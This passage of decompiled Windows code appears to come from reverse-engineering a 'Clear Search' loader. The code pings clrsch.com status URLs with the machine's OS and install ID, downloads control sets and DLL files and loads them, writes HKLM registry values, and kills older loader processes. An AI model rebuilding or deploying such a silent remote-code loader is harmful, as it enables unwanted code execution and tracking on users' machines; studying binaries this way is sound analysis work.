                 local_a0c);
    if (iVar2 == 0) {
      if (local_a28 != local_a10) {
        FUN_004125fb(local_a38,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042064c,local_a28);
        FUN_004123b0(local_a38,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e648,(LPBYTE)&param_4);
        FUN_0041546e(local_40c,(byte *)s__s_InstallID__d_GUID__s_PROMO__d_00405d68);
        uVar6 = 0;
        if (local_a20 != 0) {
          do {
            FUN_0041546e(local_90c,(byte *)s___s__d_00405c48);
            uVar4 = 0xffffffff;
            pcVar9 = local_90c;
            do {
              pcVar8 = pcVar9;
              if (uVar4 == 0) break;
              uVar4 = uVar4 - 1;
              pcVar8 = pcVar9 + 1;
              cVar1 = *pcVar9;
              pcVar9 = pcVar8;
            } while (cVar1 != '\0');
            uVar4 = ~uVar4;
            iVar2 = -1;
            pcVar9 = local_40c;
            do {
              pcVar10 = pcVar9;
              if (iVar2 == 0) break;
              iVar2 = iVar2 + -1;
              pcVar10 = pcVar9 + 1;
              cVar1 = *pcVar9;
              pcVar9 = pcVar10;
            } while (cVar1 != '\0');
            puVar7 = (undefined4 *)(pcVar8 + -uVar4);
            puVar11 = (undefined4 *)(pcVar10 + -1);
            for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
              *puVar11 = *puVar7;
              puVar7 = puVar7 + 1;
              puVar11 = puVar11 + 1;
            }
            uVar6 = uVar6 + 1;
            for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
              *(undefined *)puVar11 = *(undefined *)puVar7;
              puVar7 = (undefined4 *)((int)puVar7 + 1);
              puVar11 = (undefined4 *)((int)puVar11 + 1);
            }
          } while (uVar6 < local_a20);
        }
        iVar2 = FUN_0040d640(param_1,param_2,local_40c,&local_a14,&local_a18);
        if (iVar2 == 0) {
          FUN_004150a9(local_a14);
        }
      }
      local_4 = (uint)local_4._1_3_ << 8;
      FUN_00409fd0(local_a30);
      local_4 = 0xffffffff;
      FUN_0041205e(local_a38);
      uVar3 = 0;
    }
    else {
      local_4 = (uint)local_4._1_3_ << 8;
      FUN_00409fd0(local_a30);
      local_4 = 0xffffffff;
      FUN_0041205e(local_a38);
      uVar3 = 0xfffffffd;
    }
  }
  else {
    local_4 = (uint)local_4._1_3_ << 8;
    FUN_00409fd0(local_a30);
    local_4 = 0xffffffff;
    FUN_0041205e(local_a38);
    uVar3 = 0xffffffff;
  }
  *unaff_FS_OFFSET = local_c;
  return uVar3;
}



undefined4
FUN_0040e790(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
            undefined param_5,undefined param_6,undefined param_7,undefined param_8,
            undefined param_9,undefined param_10,undefined param_11,undefined param_12,
            undefined param_13)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  int iVar4;
  uint *puVar5;
  DWORD DVar6;
  undefined3 extraout_var;
  undefined4 uVar7;
  uint uVar8;
  uint uVar9;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  int iVar10;
  undefined4 *puVar11;
  char *pcVar12;
  char *pcVar13;
  char *pcVar14;
  undefined4 *puVar15;
  undefined4 *unaff_FS_OFFSET;
  uint uVar16;
  undefined4 in_stack_00001568;
  int in_stack_00001578;
  void *in_stack_0000157c;
  int in_stack_00001580;
  undefined4 in_stack_00001584;
  int in_stack_00001588;
  DWORD DVar17;
  undefined4 local_4;
  
  uVar7 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &stack0xfffffff4;
  FUN_00415a50((char)uVar7);
  FUN_0040bd00(&param_1,in_stack_00001578);
  iVar10 = 0;
  local_4 = 1;
  DVar17 = 0;
  FUN_00409c20(&stack0x00000950,in_stack_00001578);
  FUN_0041430f(in_stack_00001578,*(char **)(in_stack_00001588 + 0x20),
               *(char **)(in_stack_00001588 + 0x24),&DAT_0041f24c);
  FUN_0040be00(&param_1,in_stack_00001584);
  uVar16 = 0;
  if (*(int *)(in_stack_00001580 + 0x10) != 0) {
    do {
      uVar3 = FUN_00409ff0(in_stack_0000157c,(byte *)(*(int *)(in_stack_00001580 + 4) + iVar10));
      if (uVar3 == 0xffffffff) {
LAB_0040e8d3:
        uVar8 = 0xffffffff;
        pcVar13 = (char *)(*(int *)(in_stack_00001580 + 4) + 0x44 + iVar10);
        do {
          pcVar14 = pcVar13;
          if (uVar8 == 0) break;
          uVar8 = uVar8 - 1;
          pcVar14 = pcVar13 + 1;
          cVar1 = *pcVar13;
          pcVar13 = pcVar14;
        } while (cVar1 != '\0');
        uVar8 = ~uVar8;
        puVar11 = (undefined4 *)(pcVar14 + -uVar8);
        puVar15 = (undefined4 *)&param_4;
        for (uVar9 = uVar8 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
          *puVar15 = *puVar11;
          puVar11 = puVar11 + 1;
          puVar15 = puVar15 + 1;
        }
        for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
          *(undefined *)puVar15 = *(undefined *)puVar11;
          puVar11 = (undefined4 *)((int)puVar11 + 1);
          puVar15 = (undefined4 *)((int)puVar15 + 1);
        }
        puVar5 = FUN_00415540((uint *)&param_4,'\0');
        *(undefined *)((int)puVar5 + -1) = 0x5f;
        FUN_0041546e(&stack0x00000d68,(byte *)s__s__s_00404924);
        DVar17 = FUN_0040c070();
        if (DVar17 == 0) {
          DVar6 = FUN_00414c8a(in_stack_00001578,&param_4,
                               (LPCSTR)(*(int *)(in_stack_00001580 + 4) + 0x44 + iVar10));
          DVar17 = DVar6;
          FUN_0041340f(in_stack_00001578,&param_4);
          if (DVar6 == 0) {
            FUN_00414601(in_stack_00001578,(LPCSTR)(*(int *)(in_stack_00001580 + 4) + 0x44 + iVar10)
                         ,(byte **)&DAT_00405084);
            if (uVar3 == 0xffffffff) {
              FUN_0041546e(&param_11,(byte *)s_Generating_a_randomized_filename_00405e40);
              FUN_004116e9(in_stack_00001578,(char)&param_11,s_Loader_004051a0,
                           s_Update_Rules_00405e30,&param_11);
              FUN_00414be0((char *)(*(int *)(in_stack_00001580 + 4) + 0x44 + iVar10),
                           (undefined4 *)&stack0x00001168);
              FUN_00414c18(in_stack_00001578,8,&param_13);
              uVar8 = 0xffffffff;
              pcVar13 = &stack0x00001168;
              do {
                pcVar14 = pcVar13;
                if (uVar8 == 0) break;
                uVar8 = uVar8 - 1;
                pcVar14 = pcVar13 + 1;
                cVar1 = *pcVar13;
                pcVar13 = pcVar14;
              } while (cVar1 != '\0');
              uVar8 = ~uVar8;
              iVar4 = -1;
              pcVar13 = &param_13;
              do {
                pcVar12 = pcVar13;
                if (iVar4 == 0) break;
                iVar4 = iVar4 + -1;
                pcVar12 = pcVar13 + 1;
                cVar1 = *pcVar13;
                pcVar13 = pcVar12;
              } while (cVar1 != '\0');
              puVar11 = (undefined4 *)(pcVar14 + -uVar8);
              puVar15 = (undefined4 *)(pcVar12 + -1);
              for (uVar3 = uVar8 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
                *puVar15 = *puVar11;
                puVar11 = puVar11 + 1;
                puVar15 = puVar15 + 1;
              }
            }
            else {
              FUN_0041546e(&param_11,(byte *)s_Updating_the_existing_file__s_00405e10);
              FUN_004116e9(in_stack_00001578,extraout_DL,s_Loader_004051a0,s_Update_Rules_00405e30,
                           &param_11);
              uVar8 = 0xffffffff;
              pcVar13 = (char *)(uVar3 * 0x450 + 0x44 + *(int *)((int)in_stack_0000157c + 4));
              do {
                pcVar14 = pcVar13;
                if (uVar8 == 0) break;
                uVar8 = uVar8 - 1;
                pcVar14 = pcVar13 + 1;
                cVar1 = *pcVar13;
                pcVar13 = pcVar14;
              } while (cVar1 != '\0');
              uVar8 = ~uVar8;
              puVar11 = (undefined4 *)(pcVar14 + -uVar8);
              puVar15 = (undefined4 *)&param_13;
              for (uVar3 = uVar8 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
                *puVar15 = *puVar11;
                puVar11 = puVar11 + 1;
                puVar15 = puVar15 + 1;
              }
            }
            for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
              *(undefined *)puVar15 = *(undefined *)puVar11;
              puVar11 = (undefined4 *)((int)puVar11 + 1);
              puVar15 = (undefined4 *)((int)puVar15 + 1);
            }
            FUN_0041546e(&param_12,(byte *)s__s__s__s_004053b4);
            bVar2 = FUN_00414270(in_stack_00001578,
                                 (LPCSTR)(*(int *)(in_stack_00001580 + 4) + 0x44 + iVar10),&param_12
                                );
            DVar17 = CONCAT31(extraout_var,bVar2);
            FUN_0041340f(in_stack_00001578,(byte *)(*(int *)(in_stack_00001580 + 4) + 0x44 + iVar10)
                        );
            uVar3 = 0xffffffff;
            pcVar13 = &param_13;
            do {
              pcVar14 = pcVar13;
              if (uVar3 == 0) break;
              uVar3 = uVar3 - 1;
              pcVar14 = pcVar13 + 1;
              cVar1 = *pcVar13;
              pcVar13 = pcVar14;
            } while (cVar1 != '\0');
            uVar3 = ~uVar3;
            puVar11 = (undefined4 *)(pcVar14 + -uVar3);
            puVar15 = (undefined4 *)(*(int *)(in_stack_00001580 + 4) + 0x44 + iVar10);
            for (uVar8 = uVar3 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
              *puVar15 = *puVar11;
              puVar11 = puVar11 + 1;
              puVar15 = puVar15 + 1;
            }
            for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
              *(undefined *)puVar15 = *(undefined *)puVar11;
              puVar11 = (undefined4 *)((int)puVar11 + 1);
              puVar15 = (undefined4 *)((int)puVar15 + 1);
            }
            if (DVar17 == 0) {
              iVar4 = FUN_00409ce0(&stack0x00000950,&param_12);
              if (iVar4 == 0) {
                uVar7 = FUN_00409ec0((int)&stack0x00000950);
                *(undefined4 *)(*(int *)(in_stack_00001580 + 4) + 0x444 + iVar10) = uVar7;
                FUN_0041546e(&param_11,(byte *)s_Successfully_calculated_checksum_00405ddc);
                FUN_004116e9(in_stack_00001578,extraout_DL_01,s_Loader_004051a0,
                             s_Update_Rules_00405e30,&param_11);
                *(undefined4 *)(*(int *)(in_stack_00001580 + 4) + 0x448 + iVar10) = 1;
                goto LAB_0040ebfe;
              }
              FUN_0041546e(&param_11,(byte *)s_Error_loading_DLL_file___s__for_c_00404690);
              FUN_004116e9(in_stack_00001578,extraout_DL_00,s_Loader_004051a0,
                           s_Update_Rules_00405e30,&param_11);
              DVar17 = 0xffffffff;
            }
          }
        }
LAB_0040ec06:
        local_4 = 0;
      }
      else {
        iVar4 = *(int *)((int)in_stack_0000157c + 4) + uVar3 * 0x450;
        if ((*(int *)(iVar4 + 0x40) < *(int *)(*(int *)(in_stack_00001580 + 4) + 0x40 + iVar10)) ||
           (*(int *)(iVar4 + 0x448) == 0)) goto LAB_0040e8d3;
        uVar8 = 0xffffffff;
        pcVar13 = (char *)(iVar4 + 0x44);
        do {
          pcVar14 = pcVar13;
          if (uVar8 == 0) break;
          uVar8 = uVar8 - 1;
          pcVar14 = pcVar13 + 1;
          cVar1 = *pcVar13;
          pcVar13 = pcVar14;
        } while (cVar1 != '\0');
        uVar8 = ~uVar8;
        puVar11 = (undefined4 *)(pcVar14 + -uVar8);
        puVar15 = (undefined4 *)(*(int *)(in_stack_00001580 + 4) + iVar10 + 0x44);
        for (uVar9 = uVar8 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
          *puVar15 = *puVar11;
          puVar11 = puVar11 + 1;
          puVar15 = puVar15 + 1;
        }
        for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
          *(undefined *)puVar15 = *(undefined *)puVar11;
          puVar11 = (undefined4 *)((int)puVar11 + 1);
          puVar15 = (undefined4 *)((int)puVar15 + 1);
        }
        *(undefined4 *)(*(int *)(in_stack_00001580 + 4) + 0x444 + iVar10) =
             *(undefined4 *)(uVar3 * 0x450 + 0x444 + *(int *)((int)in_stack_0000157c + 4));
        *(undefined4 *)(*(int *)(in_stack_00001580 + 4) + 0x448 + iVar10) = 1;
LAB_0040ebfe:
        if (DVar17 != 0) goto LAB_0040ec06;
      }
      uVar16 = uVar16 + 1;
      iVar10 = iVar10 + 0x450;
    } while (uVar16 < *(uint *)(in_stack_00001580 + 0x10));
  }
  FUN_004144ad(in_stack_00001578);
  FUN_00409ca0((undefined4 *)&stack0x00000950);
  FUN_0040bd40((undefined4 *)&param_1);
  *unaff_FS_OFFSET = in_stack_00001568;
  return local_4;
}



int __cdecl FUN_0040ec80(int param_1)

{
  int iVar1;
  int iVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  int iVar3;
  undefined4 *unaff_FS_OFFSET;
  int local_220;
  int local_21c;
  int local_218;
  undefined4 local_214 [2];
  char local_20c [256];
  char local_10c [256];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e15b;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_214,param_1);
  local_4 = 0;
  iVar3 = -1;
  iVar1 = FUN_004123b0(local_214,(HKEY)0x80000002,&DAT_00421a4c,&DAT_0042164c,(LPBYTE)&local_218);
  if (iVar1 != 0) {
    local_218 = 0;
  }
  FUN_0041546e(local_20c,(byte *)s__d_resolvers_available__00405f08);
  FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Get_Next_Available_Resolver_00405eec,
               local_20c);
  iVar1 = FUN_004123b0(local_214,(HKEY)0x80000002,&DAT_00421a4c,&DAT_0042364c,(LPBYTE)&local_21c);
  if (iVar1 != 0) {
    local_21c = 0;
  }
  FUN_0041546e(local_20c,(byte *)s_First_resolver_is__d__00405ed4);
  FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Get_Next_Available_Resolver_00405eec,
               local_20c);
  iVar1 = local_21c;
  if (local_218 != 0) {
    do {
      FUN_0041546e(local_10c,&DAT_00405ecc);
      iVar2 = FUN_004123b0(local_214,(HKEY)0x80000002,&DAT_00421a4c,local_10c,(LPBYTE)&local_220);
      if (iVar2 != 0) {
        local_220 = 1;
      }
      FUN_0041546e(local_20c,(byte *)s_Resolver__d_status_is__ld__00405eb0);
      FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Get_Next_Available_Resolver_00405eec,
                   local_20c);
      if (local_220 == 0) goto LAB_0040ee04;
      iVar1 = iVar1 + 1;
      if (local_218 <= iVar1) {
        iVar1 = 0;
      }
    } while (iVar1 != local_21c);
    if (local_220 == 0) {
LAB_0040ee04:
      FUN_004125fb(local_214,(HKEY)0x80000002,&DAT_00421a4c,&DAT_0042364c,(iVar1 + 1) % local_218);
      FUN_0041546e(local_20c,(byte *)s_Registry_value___s__is__d__00405e94);
      FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Get_Next_Available_Resolver_00405eec,
                   local_20c);
      iVar3 = iVar1;
      if (iVar1 != -1) {
        iVar3 = iVar1 + 1;
      }
    }
  }
  FUN_0041546e(local_20c,(byte *)s_Selected_resolver_is_r_d_clrsch__00405e6c);
  FUN_004116e9(param_1,(char)local_20c,s_Loader_004051a0,s_Get_Next_Available_Resolver_00405eec,
               local_20c);
  local_4 = 0xffffffff;
  FUN_0041205e(local_214);
  *unaff_FS_OFFSET = local_c;
  return iVar3;
}



undefined4 __cdecl FUN_0040eec0(int param_1,undefined4 param_2)

{
  char cVar1;
  bool bVar2;
  int iVar3;
  uint *puVar4;
  undefined4 uVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined unaff_BL;
  undefined unaff_BP;
  undefined unaff_SI;
  undefined4 *puVar9;
  undefined unaff_DI;
  char *pcVar10;
  undefined4 *puVar11;
  undefined4 *unaff_FS_OFFSET;
  undefined in_stack_0000000c;
  char *pcVar12;
  undefined uVar13;
  uint uVar14;
  undefined in_stack_fffff2b0;
  int local_d4c;
  uint local_d48;
  int local_d40;
  undefined4 local_d38 [3];
  undefined uVar15;
  uint *in_stack_fffff2d4;
  uint local_d28;
  undefined4 local_d24 [6];
  char local_d0c [160];
  undefined in_stack_fffff394;
  undefined in_stack_fffff3d4;
  undefined4 local_c0c [238];
  undefined in_stack_fffff7ac;
  undefined in_stack_fffff7d4;
  char local_80c [1024];
  char local_40c [1024];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e191;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00409f90(&stack0xfffff2b0,param_1);
  local_4 = 0;
  FUN_0040bd00(local_d38,param_1);
  local_4._0_1_ = 1;
  local_d28 = 0x1000;
  uVar14 = 0;
  FUN_00409f90(local_d24,param_1);
  local_4 = CONCAT31(local_4._1_3_,2);
  FUN_0041546e(local_80c,(byte *)s__s__s_0040460c);
  iVar3 = FUN_0040aaf0(local_80c,0x41ee4c,(uint *)&DAT_00422a4c);
  if (iVar3 == 0) {
    FUN_0040a9a0((int)&stack0xfffff2b0,extraout_DL,local_80c);
  }
  else {
    local_d40 = 0;
    local_d48 = 0xffffffff;
    local_d4c = 0;
  }
  iVar3 = FUN_0040ec80(param_1);
  FUN_0041546e(local_d0c,(byte *)s_Next_Available_Resolver_is__d__00406124);
  FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Update_ControlSet_00406110,local_d0c);
  if (iVar3 == -1) {
    uVar7 = 0xffffffff;
    pcVar12 = s_http___status_clrsch_com_loader__004060e8;
    do {
      pcVar10 = pcVar12;
      if (uVar7 == 0) break;
      uVar7 = uVar7 - 1;
      pcVar10 = pcVar12 + 1;
      cVar1 = *pcVar12;
      pcVar12 = pcVar10;
    } while (cVar1 != '\0');
    uVar7 = ~uVar7;
    puVar9 = (undefined4 *)(pcVar10 + -uVar7);
    puVar11 = local_c0c;
    for (uVar8 = uVar7 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
      *puVar11 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar11 = puVar11 + 1;
    }
    for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {
      *(undefined *)puVar11 = *(undefined *)puVar9;
      puVar9 = (undefined4 *)((int)puVar9 + 1);
      puVar11 = (undefined4 *)((int)puVar11 + 1);
    }
  }
  else {
    FUN_0041546e((char *)local_c0c,(byte *)s_http___r_d_clrsch_com_loader_pin_004060c4);
  }
  FUN_0041546e(local_d0c,(byte *)s_Status_ping_URL_is___s___004060a8);
  FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Update_ControlSet_00406110,local_d0c);
  FUN_0041546e(local_40c,(byte *)s__s_Client__s_OS__s_InstallID__d__00406068);
  iVar3 = FUN_0040d640(param_1,param_2,local_40c,(uint **)&stack0xfffff2d4,&local_d28);
  if (iVar3 == 0) {
    puVar4 = FUN_00415a80(in_stack_fffff2d4,s_<CTRL_VER__0040605c);
    if (puVar4 == (uint *)0x0) {
      local_4._0_1_ = 1;
      FUN_00409fd0(local_d24);
      local_4 = (uint)local_4._1_3_ << 8;
      FUN_0040bd40(local_d38);
      local_4 = 0xffffffff;
      FUN_00409fd0((undefined4 *)&stack0xfffff2b0);
      uVar5 = 0xfffffffd;
      goto LAB_0040f2b6;
    }
    uVar7 = 0xffffffff;
    pcVar12 = s_<CTRL_VER__0040605c;
    do {
      if (uVar7 == 0) break;
      uVar7 = uVar7 - 1;
      cVar1 = *pcVar12;
      pcVar12 = pcVar12 + 1;
    } while (cVar1 != '\0');
    FUN_004154f3((uint *)((int)puVar4 + (~uVar7 - 1)),&DAT_004042f8);
  }
  uVar15 = SUB41(in_stack_fffff2d4,0);
  bVar2 = true;
  if (local_d40 != 0) {
    piVar6 = (int *)(local_d4c + 0x448);
    do {
      if (*piVar6 == 0) {
        bVar2 = false;
      }
      piVar6 = piVar6 + 0x114;
      local_d40 = local_d40 + -1;
    } while (local_d40 != 0);
  }
  if (((local_d48 == 0xffffffff) || (!bVar2)) || (local_d48 < uVar14)) {
    FUN_0041546e(local_d0c,(byte *)s_Local_control_set__d_<_latest_co_00405fc4);
    uVar13 = (undefined)uVar14;
    FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Update_ControlSet_00406110,local_d0c);
    iVar3 = FUN_0040b260(local_d24,param_2,s_http___sds_clrsch_com_loader_00405b98);
    if (iVar3 == 0) {
      iVar3 = FUN_0040e790((char)param_1,(char)&stack0xfffff2b0,(char)local_d24,(char)param_2,
                           in_stack_0000000c,unaff_DI,unaff_SI,unaff_BP,unaff_BL,uVar13,uVar15,
                           in_stack_fffff3d4,in_stack_fffff7d4);
      if (iVar3 != 0) {
        FUN_0040b5d0((char)local_80c,0x4c,0x4c,0x4c,unaff_DI,unaff_SI,unaff_BP,unaff_BL,uVar13,
                     in_stack_fffff2b0,in_stack_fffff394,in_stack_fffff7ac);
        pcVar12 = s_Successfully_retrieved_the_lates_00405f24;
        goto LAB_0040f260;
      }
      pcVar12 = s_Error_retrieving_new_rules_for_c_00405f60;
    }
    else {
      pcVar12 = s_Error_downloading_control_set_ve_00405f98;
    }
    FUN_0041546e(local_d0c,(byte *)pcVar12);
    FUN_004116e9(param_1,extraout_DL_03,s_Loader_004051a0,s_Update_ControlSet_00406110,local_d0c);
    local_4._0_1_ = 1;
    FUN_00409fd0(local_d24);
    local_4 = (uint)local_4._1_3_ << 8;
    FUN_0040bd40(local_d38);
    local_4 = 0xffffffff;
    FUN_00409fd0((undefined4 *)&stack0xfffff2b0);
    uVar5 = 0xffffffff;
  }
  else {
    pcVar12 = s_Local_control_set__d_is_current_a_0040602c;
LAB_0040f260:
    FUN_0041546e(local_d0c,(byte *)pcVar12);
    FUN_004116e9(param_1,(char)local_d0c,s_Loader_004051a0,s_Update_ControlSet_00406110,local_d0c);
    local_4._0_1_ = 1;
    FUN_00409fd0(local_d24);
    local_4 = (uint)local_4._1_3_ << 8;
    FUN_0040bd40(local_d38);
    local_4 = 0xffffffff;
    FUN_00409fd0((undefined4 *)&stack0xfffff2b0);
    uVar5 = 0;
  }
LAB_0040f2b6:
  *unaff_FS_OFFSET = local_c;
  return uVar5;
}



void __cdecl FUN_0040f2d0(int param_1,undefined4 param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  void *pvVar4;
  int iVar5;
  void *this;
  char *pcVar6;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  char *extraout_EDX;
  undefined4 *unaff_FS_OFFSET;
  char *pcVar7;
  DWORD local_a4c;
  int local_a48;
  int local_a44 [13];
  undefined4 local_a10;
  char local_a0c [256];
  undefined4 local_90c [64];
  undefined4 local_80c;
  char local_808 [1020];
  byte local_40c [1024];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e1ab;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  local_a48 = 0;
  FUN_004131f9(DAT_004251cc,local_90c);
  local_4 = 0;
  FUN_00411ec0(local_a44);
  FUN_00411b50(local_a44);
  do {
    if (local_a48 != 0) {
      if (0 < param_3) {
        do {
          FUN_0041546e((char *)local_40c,(byte *)s__s_EXE_004061ec);
          FUN_0041546e(local_a0c,(byte *)s_Terminating_Random_Loader_Proces_004061c4);
          FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,
                       s_Terminate_Old_Loader_Processes_00406254,local_a0c);
          uVar3 = FUN_0041dd90(local_40c,(byte *)local_90c,local_40c);
          if (uVar3 == 0) {
            FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,
                         s_Terminate_Old_Loader_Processes_00406254,
                         s_Error__Attempting_to_terminate_s_00406144);
          }
          else {
            FUN_0041546e(local_a0c,(byte *)s_Terminating_Random_Loader_Proces_004061c4);
            FUN_004116e9(param_1,(char)local_a0c,s_Loader_004051a0,
                         s_Terminate_Old_Loader_Processes_00406254,local_a0c);
            iVar5 = FUN_00411cb0(local_a44,local_40c,&local_a4c);
            if (iVar5 == 0) {
              FUN_00411c80(local_a4c);
              pcVar6 = s_Successfully_terminated_Loader_P_00406198;
            }
            else {
              pcVar6 = s_Error__Could_not_find_Loader_Pro_0040616c;
            }
            FUN_0041546e(local_a0c,(byte *)pcVar6);
            FUN_004116e9(param_1,(char)local_a0c,s_Loader_004051a0,
                         s_Terminate_Old_Loader_Processes_00406254,local_a0c);
          }
          param_3 = param_3 + -1;
        } while (param_3 != 0);
      }
      FUN_0041546e((char *)local_40c,(byte *)s__s_EXE_004061ec);
      uVar3 = FUN_0041dd90(local_40c,(byte *)local_90c,local_40c);
      if (uVar3 == 0) {
        pcVar7 = s_Error__Attempting_to_terminate_s_00406144;
        pcVar6 = extraout_EDX;
      }
      else {
        iVar5 = FUN_00411cb0(local_a44,local_40c,&local_a4c);
        if (iVar5 == 0) {
          FUN_00411c80(local_a4c);
          pcVar6 = s_Successfully_terminated_Loader_P_00406198;
        }
        else {
          pcVar6 = s_Error__Could_not_find_Loader_Pro_0040616c;
        }
        FUN_0041546e(local_a0c,(byte *)pcVar6);
        pcVar6 = local_a0c;
        pcVar7 = pcVar6;
      }
      FUN_004116e9(param_1,(char)pcVar6,s_Loader_004051a0,s_Terminate_Old_Loader_Processes_00406254,
                   pcVar7);
      local_4 = 0xffffffff;
      FUN_00411af0(local_a44);
      *unaff_FS_OFFSET = local_c;
      return;
    }
    FUN_00411bd0(local_a44,&local_a4c);
    FUN_00411c50(local_a44,&local_a10);
    FUN_00411c00(local_a44,&local_80c);
    FUN_0041546e(local_a0c,(byte *)s_Found_process___s_00406274);
    FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Terminate_Old_Loader_Processes_00406254,
                 local_a0c);
    FUN_0041455b((undefined *)&local_80c,(char *)&local_80c);
    uVar3 = FUN_0041dd90(&local_80c,(byte *)local_90c,(byte *)&local_80c);
    if (uVar3 == 0) goto LAB_0040f4ed;
    uVar3 = FUN_0041dd90(this,(byte *)&local_80c,(byte *)s_loader_exe_00406248);
    if (uVar3 == 0) {
LAB_0040f4ad:
      FUN_0041546e(local_a0c,(byte *)s_Found_Loader__Terminating__s_pro_00406218);
      FUN_004116e9(param_1,(char)local_a0c,s_Loader_004051a0,
                   s_Terminate_Old_Loader_Processes_00406254,local_a0c);
      FUN_00411c80(local_a4c);
    }
    else {
      pvVar4 = FUN_0041de20((byte *)&local_80c,&DAT_00406244,(void *)0x3);
      if (pvVar4 == (void *)0x0) {
        pcVar6 = (char *)((int)&local_80c + 3);
        bVar2 = true;
        cVar1 = local_80c._3_1_;
        while (((cVar1 != '.' && (cVar1 != '\0')) && (bVar2))) {
          if ((cVar1 < '0') || ('9' < cVar1)) {
            bVar2 = false;
          }
          cVar1 = pcVar6[1];
          pcVar6 = pcVar6 + 1;
        }
        cVar1 = *pcVar6;
joined_r0x0040f4a7:
        if ((cVar1 != '\0') && (bVar2)) goto LAB_0040f4ad;
      }
      else {
        pvVar4 = FUN_0041de20((byte *)&local_80c,&DAT_00406240,(void *)0x3);
        if (pvVar4 == (void *)0x0) {
          pcVar6 = (char *)((int)&local_80c + 3);
          bVar2 = true;
          while ((cVar1 = *pcVar6, cVar1 != '\0' && (bVar2))) {
            if ((cVar1 < '0') || ('9' < cVar1)) {
              bVar2 = false;
            }
            pcVar6 = pcVar6 + 1;
          }
          if (*pcVar6 != '\0') {
            cVar1 = pcVar6[1];
            while (((cVar1 != '.' && (cVar1 != '\0')) && (bVar2))) {
              if ((cVar1 < '0') || ('9' < cVar1)) {
                bVar2 = false;
              }
              cVar1 = pcVar6[2];
              pcVar6 = pcVar6 + 1;
            }
            cVar1 = pcVar6[1];
            goto joined_r0x0040f4a7;
          }
        }
      }
LAB_0040f4ed:
      FUN_0041546e(local_a0c,(byte *)s__s_is_not_a_Clear_Search_loader_004061f4);
      FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,
                   s_Terminate_Old_Loader_Processes_00406254,local_a0c);
    }
    FUN_00411b80(local_a44);
    FUN_00411bc0(local_a44,&local_a48);
  } while( true );
}



void __cdecl
FUN_0040f750(int param_1,LPCSTR param_2,LPCSTR param_3,LPBYTE param_4,LPBYTE param_5,LPBYTE param_6)

{
  int iVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_114 [2];
  char local_10c [256];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e1cb;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_114,param_1);
  local_4 = 0;
  FUN_0041546e(local_10c,(byte *)s_Old_Clear_Search_application_det_0040636c);
  FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Copy_PromoCode_InstallID_DateIns_0040633c,
               local_10c);
  iVar1 = FUN_004123b0(local_114,(HKEY)0x80000002,param_2,s_promo_00406334,param_4);
  if (iVar1 != 0) {
    FUN_0041546e(local_10c,(byte *)s_Promo_Code_not_detected_not_dete_004062fc);
    FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,
                 s_Copy_PromoCode_InstallID_DateIns_0040633c,local_10c);
  }
  iVar1 = FUN_004123b0(local_114,(HKEY)0x80000002,param_3,s_install_id_004062f0,param_5);
  if (iVar1 != 0) {
